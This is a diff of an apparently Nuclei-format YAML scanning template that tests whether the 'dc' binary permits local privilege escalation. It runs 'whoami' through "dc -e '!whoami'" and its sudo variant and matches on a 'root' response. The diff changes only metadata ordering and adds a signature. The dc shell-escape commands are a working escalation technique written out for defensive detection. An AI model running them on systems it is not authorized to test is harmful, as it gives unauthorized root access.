@@ -1,5 +1,4 @@
 id: privesc-dc
-
 info:
   name: dc - Privilege Escalation
   author: daffainfo
@@ -9,30 +8,25 @@ info:
   reference:
     - https://gtfobins.github.io/gtfobins/dc/
   metadata:
-    verified: true
     max-request: 3
-  tags: code,linux,dc,privesc,local
-
-self-contained: true
+    verified: true
+  tags: code,dc,linux,local,privesc
 code:
   - engine:
       - sh
       - bash
     source: |
       whoami
-
   - engine:
       - sh
       - bash
     source: |
       dc -e '!whoami'
-
   - engine:
       - sh
       - bash
     source: |
       sudo dc -e '!whoami'
-
     matchers-condition: and
     matchers:
       - type: word
@@ -40,10 +34,10 @@ code:
         words:
           - "root"
         negative: true
-
       - type: dsl
         dsl:
           - 'contains(code_2_response, "root")'
           - 'contains(code_3_response, "root")'
         condition: or
-
+        # digest: 4a0a00473045022100c08d4a1bf6ba06b4e834c6dccf0490e89c4ca65b54428acc0da63f12e04c850a02205d2cd527e5ee8d808432a8d0eccb19a186ae19fa2be7debaf8823230367b9dc2:922c64590222798bb761d5b6d8e72950
+self-contained: true
